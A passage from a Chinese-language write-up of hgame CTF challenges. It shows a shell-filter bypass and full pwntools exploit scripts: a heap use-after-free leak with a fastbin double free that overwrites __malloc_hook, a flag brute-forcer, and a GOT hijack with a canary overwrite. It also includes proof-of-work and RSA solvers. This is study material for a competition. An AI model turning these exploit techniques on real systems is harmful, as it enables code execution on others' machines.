<p>第一个限制就是不能出现sh和cat，还有一些shell的元字符，然后就是关闭了输出流，也就是所有输出都看不到，可以通过<code>exec /bin/sh 1&gt;&amp;0</code>将输出流重定向到0（0不是stdin吗？其实0,1,2都是绑定到同一个tty里的），我们可以先通过执行<code>/bin/&#39;s&#39;h</code>来绕过<code>sh</code>这个词的限制，然后再执行<code>exec /bin/sh 1&gt;&amp;0</code>打开输出流</p>
<p>第一步有很多方法，除了<code>/bin/&#39;s&#39;h</code>还可以<code>$0</code>（具体可以查$0这个变量是什么意思，这个是做完后学长说的，据说这才是预期解），我还想到一个<code>/bin/?h</code>，用<code>?</code>通配符，这里没有限制这个元字符</p>
<p>我的操作如下：</p>
<p><img src="/images/1966f4b8/pwn-1-2.png" alt="2"></p>
<hr>
<h3 id="Roc826s-Note"><a href="#Roc826s-Note" class="headerlink" title="Roc826s_Note"></a>Roc826s_Note</h3><p>关于堆的题，呃，我糊里糊涂就pwn出来了，堆还似懂非懂的，那怎么写wp呢？</p>
<p>呃。。。大概思路就是通过UAF泄露unsorted bin的地址，从而计算出libc的基址。然后通过double free来控制fast bin，使得malloc到一块想要写数据的地址，这里选取<code>__malloc_hook</code>这个区域，这个区域是存一个函数地址，然后malloc的时候会调用这个函数，只要把这块区域改写成one_gadget的地址，再malloc就可以getshell了。double free的利用方法可以参考一下这篇文章：<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698">https://blog.csdn.net/Breeze_CAT/article/details/103788698</a></p>
<p>具体看我的exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>


<span class="token comment">#io = process(['./Roc826'])#, env=&#123;'LD_PRELOAD': './libc-2.23.so'&#125;)</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">21002</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size?\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index?\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index?\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment">#gdb.attach(io)</span>

<span class="token comment"># leak出libc基址</span>
add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment"># 0</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>

<span class="token comment"># UAF</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>
address <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment"># 0x7fffff3f4b78</span>
<span class="token keyword">print</span> <span class="token string">'address='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span>

libc_base <span class="token operator">=</span> address<span class="token operator">-</span><span class="token punctuation">(</span><span class="token number">0x7f7b603f4b78</span><span class="token operator">-</span><span class="token number">0x7f7b60030000</span><span class="token punctuation">)</span>  <span class="token comment"># 后面的括号计算unsorted bin相对于libc的偏移</span>

<span class="token keyword">print</span> <span class="token string">'libc_base='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>

<span class="token comment">#gdb.attach(io)</span>

malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
<span class="token comment">#one_gadget_offset = 0x4526a</span>
one_gadget_offset <span class="token operator">=</span> <span class="token number">0xf1147</span>
one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> one_gadget_offset

<span class="token keyword">print</span> <span class="token string">'malloc_hook='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'one_gadget='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>

<span class="token comment"># double free</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token comment">#gdb.attach(io)</span>

<span class="token comment"># 通过这个修改 #1 的fb指针</span>
<span class="token comment"># 减去0x23的这个位置，size字段刚好是0x80符合安全检查</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook<span class="token operator">-</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 3 1</span>

<span class="token comment">#gdb.attach(io)</span>

add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment"># 4 2</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment"># 5 1</span>

<span class="token comment">#gdb.attach(io)</span>

<span class="token comment"># 成功修改__malloc_hook</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># malloc_hook+0x20</span>
<span class="token comment">#gdb.attach(io)</span>

<span class="token comment"># 再malloc一次就可以触发__malloc_hook了</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size?\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">#gdb.attach(io)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="Another-Heaven"><a href="#Another-Heaven" class="headerlink" title="Another_Heaven"></a>Another_Heaven</h3><p>关键点：</p>
<p><img src="/images/1966f4b8/pwn-3-1.png" alt="1"></p>
<p>可以通过第一处红框的代码，写入<code>\x00</code>就是字符串结束符，来截断flag，结合第二个红框处验证，爆破flag</p>
<p>exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> sys <span class="token keyword">import</span> exit
<span class="token keyword">from</span> string <span class="token keyword">import</span> printable

<span class="token comment"># flag被读到的位置</span>
flag_addr <span class="token operator">=</span> <span class="token number">0x602160</span>

<span class="token keyword">def</span> <span class="token function">validate</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#io = process('./Another_Heaven')</span>
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">21001</span><span class="token punctuation">)</span>

    cut_addr <span class="token operator">=</span> flag_addr <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Annevi!"\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>cut_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment">#io.sleep(0.1)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token comment"># 截断flag</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Account:'</span><span class="token punctuation">,</span> <span class="token string">'E99p1ant'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Password:'</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span>

    msg <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'Wrong'</span> <span class="token keyword">in</span> msg<span class="token punctuation">:</span>
        ret <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        ret <span class="token operator">=</span> <span class="token boolean">True</span>
    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> ret


<span class="token comment"># 爆破flag</span>
flag_len <span class="token operator">=</span> <span class="token number">64</span>
flag <span class="token operator">=</span> <span class="token string">'hgame&#123;'</span>

<span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">&lt;</span> flag_len<span class="token punctuation">:</span>
    <span class="token keyword">for</span> ch <span class="token keyword">in</span> printable<span class="token punctuation">:</span>
        new_flag <span class="token operator">=</span> flag <span class="token operator">+</span> ch
        <span class="token keyword">if</span> validate<span class="token punctuation">(</span>new_flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
            flag <span class="token operator">=</span> new_flag
            <span class="token keyword">print</span> flag
            <span class="token keyword">if</span> ch <span class="token operator">==</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>
                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="形而上的坏死"><a href="#形而上的坏死" class="headerlink" title="形而上的坏死"></a>形而上的坏死</h3><p>首先要知道的是，栈上面有个返回地址，是返回到<code>__libc_start_main</code>那边的，可以泄露出来得到libc的基址。</p>
<p>利用的漏洞点：</p>
<p><img src="/images/1966f4b8/pwn-4-2.png" alt="2"></p>
<p><img src="/images/1966f4b8/pwn-4-3.png" alt="3"></p>
<p>然后利用以下漏洞点，来劫持got表项为one_gadget</p>
<p><img src="/images/1966f4b8/pwn-4-6.png" alt="6"></p>
<p>我选择劫持的是<code>__stack_chk_fail</code>，所以还要修改canary来触发。</p>
<p>漏洞点：</p>
<p><img src="/images/1966f4b8/pwn-4-4.png" alt="4"></p>
<p>可以通过负数绕过20的限制，因为和20比较的时候是有符号数比较，而后面是只取了读入的数据的最低处的那个字节来使用，那么可以将要读入的数据进行最高位置为1成为负数，就可以绕过20的限制了，再通过这个写内存的操作来修改canary。</p>
<p>最后exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf-8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> sys <span class="token keyword">import</span> exit
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep

<span class="token comment">#context(arch='amd64', os='linux')</span>
<span class="token comment">#context.terminal = ["tmux", "splitw", "-h"]</span>
<span class="token comment">#context.log_level = 'debug'</span>

<span class="token keyword">def</span> <span class="token function">get_realnum</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""保留数字n的最低那个字节，最高位置为1，使其成为负数"""</span>
    n <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">0x80000000</span>
    <span class="token keyword">return</span> u32<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span> signed<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

<span class="token comment">#io = process(['./Metaphysical_Necrosis'])#, env=&#123;'LD_PRELOAD': './libc-2.23.so'&#125;)</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">21003</span><span class="token punctuation">)</span>

libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Metaphysical_Necrosis'</span><span class="token punctuation">)</span>

<span class="token comment">#gdb.attach(io)</span>
<span class="token comment">#sleep(1)</span>

<span class="token comment"># 栈上面有个返回地址__libc_start_main+E7</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'哪里呢？\n'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">)</span> <span class="token comment"># 5处，有个__libc_start_main+E7</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment"># 低字节变成0x0a  泄露出来的就是__libc_start_main+??</span>

io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'planted!\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'吼不吼啊！\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'起个名字:'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">)</span>

<span class="token comment"># 第22处是canary，触发__stack_chk_fail</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'几段呢？\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>get_realnum<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'怎么料理呢：'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'吃了大半。\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'从中散发。\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>

<span class="token comment"># &amp;e99 + 8 * v == __stack_chk_fail;</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'是__m:\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># -19是__stack_chk_fail的地方</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Terrorist Win\n'</span><span class="token punctuation">)</span>

<span class="token comment">#gdb.attach(io)</span>
<span class="token comment">#sleep(1)</span>

addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
libc_base <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token number">0xfffffffffffff000</span>

<span class="token keyword">print</span> <span class="token string">'libc_base: '</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>

one_gadget_offset <span class="token operator">=</span> <span class="token number">0x45216</span>
one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> one_gadget_offset

<span class="token comment">#print io.recv()</span>

<span class="token keyword">print</span> <span class="token string">'one_gadget: '</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'？~…____'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#gdb.attach(io)</span>
<span class="token comment">#sleep(1)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Verification-code"><a href="#Verification-code" class="headerlink" title="Verification_code"></a>Verification_code</h3><p>问就是爆破，脚本如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> string
<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256

charset <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits

<span class="token keyword">def</span> <span class="token function">generateXXXX</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> a1 <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
        <span class="token keyword">for</span> a2 <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
            <span class="token keyword">for</span> a3 <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
                <span class="token keyword">for</span> a4 <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
                    <span class="token keyword">yield</span> <span class="token punctuation">(</span>a1<span class="token operator">+</span>a2<span class="token operator">+</span>a3<span class="token operator">+</span>a4<span class="token punctuation">)</span>


io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.98.192.231'</span><span class="token punctuation">,</span> <span class="token number">25678</span><span class="token punctuation">)</span>
tail <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">') =='</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'sha256(XXXX+'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">') =='</span><span class="token punctuation">)</span>
_hexdigest <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">#tail = '3716IrYIJ6jB8hCO'</span>
<span class="token comment">#_hexdigest = '538f1eec92e9a92476e9ec878b08d601d9a0af3907f1fec94c1577309b2f9b64'</span>

<span class="token keyword">print</span> <span class="token string">'tail&#123;'</span> <span class="token operator">+</span> tail <span class="token operator">+</span> <span class="token string">'&#125;'</span>
<span class="token keyword">print</span> <span class="token string">'_hexdigest&#123;'</span> <span class="token operator">+</span> _hexdigest <span class="token operator">+</span> <span class="token string">'&#125;'</span>

<span class="token keyword">for</span> x <span class="token keyword">in</span>  generateXXXX<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    h <span class="token operator">=</span> sha256<span class="token punctuation">(</span>x<span class="token operator">+</span>tail<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> h <span class="token operator">==</span> _hexdigest<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">'XXXX&#123;'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'&#125;'</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'I like playing Hgame'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="Remainder"><a href="#Remainder" class="headerlink" title="Remainder"></a>Remainder</h3><p>孙子定理套公式，得到<code>c = m的e次方 % (p*q*r)</code>，然后直接开方！（我就是蠢成这样）</p>
<p>当然不是这么搞，问了下学长，当成rsa来搞.</p>
<p>因为p,q,r都是质数，所以那个欧拉函数（是这么叫的吧）就是</p>
<p><code>phi = (p-1)*(q-1)*(r*1)</code></p>
<p>然后可以解出私钥d，然后<code>pow(c, d, p*q*r)</code>就可以得出m了</p>
<p>具体exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>

<span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> binascii
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> number

p <span class="token operator">=</span> <span class="token number">94598296305713376652540411631949434301396235111673372738276754654188267010805522542068004453137678598891335408170277601381944584279339362056579262308427544671688614923839794522671378559276784734758727213070403838632286280473450086762286706863922968723202830398266220533885129175502142533600559292388005914561</span>
q <span class="token operator">=</span> <span class="token number">150088216417404963893679242888992998793257903343994792697939121738029477790454833496600101388493792476973514786401036309378542808470513073408894727406158296404360452232777491992630316999043165374635001806841520490997788796152678742544032835808854339130676283497122770901196468323977265095016407164510827505883</span>
r <span class="token operator">=</span> <span class="token number">145897736096689096151704740327665176308625097484116713780050311198775607465862066406830851710261868913835866335107146242979359964945125214420821146670919741118254402096944139483988745450480989706524191669371208210272907563936516990473246615375022630708213486725809819360033470468293100926616729742277729705727</span>

c1 <span class="token operator">=</span> <span class="token number">78430786011650521224561924814843614294806974988599591058915520397518526296422791089692107488534157589856611229978068659970976374971658909987299759719533519358232180721480719635602515525942678988896727128884803638257227848176298172896155463813264206982505797613067215182849559356336015634543181806296355552543</span> 
c2 <span class="token operator">=</span> <span class="token number">49576356423474222188205187306884167620746479677590121213791093908977295803476203510001060180959190917276817541142411523867555147201992480220531431019627681572335103200586388519695931348304970651875582413052411224818844160945410884130575771617919149619341762325633301313732947264125576866033934018462843559419</span> 
c3 <span class="token operator">=</span> <span class="token number">48131077962649497833189292637861442767562147447040134411078884485513840553188185954383330236190253388937785530658279768620213062244053151614962893628946343595642513870766877810534480536737200302699539396810545420021054225204683428522820350356470883574463849146422150244304147618195613796399010492125383322922</span>

n1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>q<span class="token operator">*</span>r<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">*</span> q <span class="token operator">*</span> r <span class="token operator">*</span> c1
n2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>p<span class="token operator">*</span>r<span class="token punctuation">,</span> q<span class="token punctuation">)</span> <span class="token operator">*</span> p <span class="token operator">*</span> r <span class="token operator">*</span> c2
n3 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>p<span class="token operator">*</span>q<span class="token punctuation">,</span> r<span class="token punctuation">)</span> <span class="token operator">*</span> p <span class="token operator">*</span> q <span class="token operator">*</span> c3

N <span class="token operator">=</span> p <span class="token operator">*</span> q <span class="token operator">*</span> r
c <span class="token operator">=</span> <span class="token punctuation">(</span>n1 <span class="token operator">+</span> n2 <span class="token operator">+</span> n3<span class="token punctuation">)</span> <span class="token operator">%</span> N <span class="token comment"># m^e % N = c --> c = pow(m, e, N)</span>

phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># p q r 都是质数</span>
e <span class="token operator">=</span> <span class="token number">65537</span>

d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>

